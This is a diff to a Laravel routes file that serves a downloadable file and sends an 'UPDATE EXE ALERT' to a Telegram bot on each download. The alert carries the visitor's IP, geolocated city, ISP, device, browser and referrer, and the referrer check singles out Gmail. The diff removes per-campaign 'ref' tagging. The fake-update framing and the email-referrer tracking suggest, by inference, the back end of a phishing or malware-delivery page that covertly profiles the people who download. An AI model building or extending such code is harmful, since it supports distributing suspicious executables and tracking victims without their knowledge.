@@ -1,62 +1,15 @@
 <?php
 
-use Illuminate\Support\Facades\Route;
-use Illuminate\Support\Facades\Cookie;
-use Illuminate\Support\Facades\Http;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Http;
+use Illuminate\Support\Facades\Route;
 
-// Work out which tag this visitor is (query param first, then saved cookie)
-if (! function_exists('minne_tag')) {
-    function minne_tag(Request $request): string
-    {
-        $ref = trim((string) ($request->query('ref') ?? $request->cookie('minne_ref') ?? ''));
-
-        foreach (config('minne.tags', []) as $tag) {
-            if (strcasecmp($ref, $tag) === 0) {
-                return $tag; // clean casing
-            }
-        }
-
-        return $ref === '' ? 'Direct' : 'Unknown';
-    }
-}
-
-// Send a Telegram message (reads token + chat id from config/minne.php)
-if (! function_exists('minne_notify')) {
-    function minne_notify(string $text): void
-    {
-        $token  = config('minne.telegram_bot_token');
-        $chatId = config('minne.telegram_chat_id');
-
-        if (! $token || ! $chatId) {
-            return;
-        }
-
-        try {
-            Http::timeout(4)->post("https://api.telegram.org/bot{$token}/sendMessage", [
-                'chat_id'    => $chatId,
-                'text'       => $text,
-                'parse_mode' => 'HTML',
-            ]);
-        } catch (\Throwable $e) {
-            // never break the page over a notify
-        }
-    }
-}
-
-// Home page
-Route::get('/', function (Request $request) {
-    $tag = minne_tag($request);
-
-    if ($request->query('ref')) {
-        Cookie::queue('minne_ref', $request->query('ref'), 60 * 24 * 30); // remember 30 days
-        minne_notify("👀 <b>Page visit</b>\nTag: <b>{$tag}</b>");
-    }
-
+// Home page: shows your index.html
+Route::get('/', function () {
     return response()->file(resource_path('site/index.html'));
 });
 
-// Download handler (your full original logic + tag support)
+// Download handler: sends a Telegram notification, then serves the file
 $download = function (Request $request) {
     $name = basename((string) config('minne.download_filename'));
     $path = resource_path('site/files/' . $name);
@@ -136,7 +89,6 @@ $download = function (Request $request) {
             }
 
             $host = strtolower((string) (parse_url($ref, PHP_URL_HOST) ?? ''));
-
             if (str_contains($host, 'mail.google') || str_contains($host, 'gmail')) {
                 return 'Gmail';
             }
@@ -172,6 +124,7 @@ $download = function (Request $request) {
             if (strlen($countryCode) !== 2) {
                 return '🌍';
             }
+
             $code = strtoupper($countryCode);
 
             return mb_chr(0x1F1E6 + ord($code[0]) - ord('A'))
@@ -180,8 +133,7 @@ $download = function (Request $request) {
 
         $isUniqueVisitor = function (string $ip): bool {
             $logFile = storage_path('app/visitors.log');
-            $dir     = dirname($logFile);
-
+            $dir = dirname($logFile);
             if (! is_dir($dir)) {
                 mkdir($dir, 0755, true);
             }
@@ -199,17 +151,15 @@ $download = function (Request $request) {
             return true;
         };
 
-        $ip        = $clientIp($request);
-        $ua        = (string) $request->userAgent();
-        $device    = $detectDevice($ua);
-        $browser   = $detectBrowser($ua);
-        $referrer  = $detectReferrer($request);
-        $type      = $request->query('type', 'download');
-        $isUnique  = $isUniqueVisitor($ip);
-        $tag       = minne_tag($request);   // ← new tagging support
+        $ip       = $clientIp($request);
+        $ua       = (string) $request->userAgent();
+        $device   = $detectDevice($ua);
+        $browser  = $detectBrowser($ua);
+        $referrer = $detectReferrer($request);
+        $type     = $request->query('type', 'download');
+        $isUnique = $isUniqueVisitor($ip);
 
         $city = $country = $countryCode = $isp = $timezone = 'Unknown';
-
         $geo = Http::timeout(4)
             ->get("http://ip-api.com/json/{$ip}", [
                 'fields' => 'status,country,countryCode,city,isp,timezone',
@@ -217,15 +167,14 @@ $download = function (Request $request) {
             ->json();
 
         if (is_array($geo) && ($geo['status'] ?? null) === 'success') {
-            $city        = $geo['city'] ?? 'Unknown';
-            $country     = $geo['country'] ?? 'Unknown';
+            $city        = $geo['city']        ?? 'Unknown';
+            $country     = $geo['country']     ?? 'Unknown';
             $countryCode = $geo['countryCode'] ?? '';
-            $isp         = $geo['isp'] ?? 'Unknown';
-            $timezone    = $geo['timezone'] ?? 'Unknown';
+            $isp         = $geo['isp']         ?? 'Unknown';
+            $timezone    = $geo['timezone']    ?? 'Unknown';
         }
 
         $flag = $countryFlag((string) $countryCode);
-
         $localTime = 'Unknown';
         if ($timezone !== 'Unknown') {
             try {
@@ -236,15 +185,12 @@ $download = function (Request $request) {
         }
 
         $uniqueLabel = $isUnique ? '🆕 NEW VISITOR' : '🔁 RETURNING VISITOR';
-
         $e = fn ($value) => htmlspecialchars((string) $value, ENT_QUOTES, 'UTF-8');
-
-        $configTag = (string) config('minne.telegram_tag', '');
+        $tag = (string) config('minne.telegram_tag', '');
 
         $message  = "🚨 <b>UPDATE EXE ALERT</b>\n";
         $message .= "━━━━━━━━━━━━━━━━━━━━\n";
         $message .= "📁 <b>File:</b> " . $e($name) . "\n";
-        $message .= "🏷 <b>Tag:</b> " . $e($tag) . "\n";          // ← added tag line
         $message .= "👤 <b>Visitor:</b> {$uniqueLabel}\n";
         $message .= "📱 <b>Device:</b> " . $e($device) . "\n";
         $message .= "🌐 <b>Browser:</b> " . $e($browser) . "\n";
@@ -256,7 +202,7 @@ $download = function (Request $request) {
         $message .= "🔗 <b>Type:</b> " . $e($type) . "\n";
         $message .= "🔒 <b>IP:</b> " . $e($ip) . "\n";
         $message .= "━━━━━━━━━━━━━━━━━━━━\n";
-        $message .= $configTag;
+        $message .= $tag;
 
         $logLine = implode(' | ', [
             now()->toDateTimeString(),
@@ -267,9 +213,7 @@ $download = function (Request $request) {
             $referrer,
             $isUnique ? 'UNIQUE' : 'RETURNING',
             $name,
-            $tag,                       // ← also log the tag
         ]) . "\n";
-
         file_put_contents(storage_path('logs/downloads.log'), $logLine, FILE_APPEND | LOCK_EX);
 
         if ($token && $chatId) {
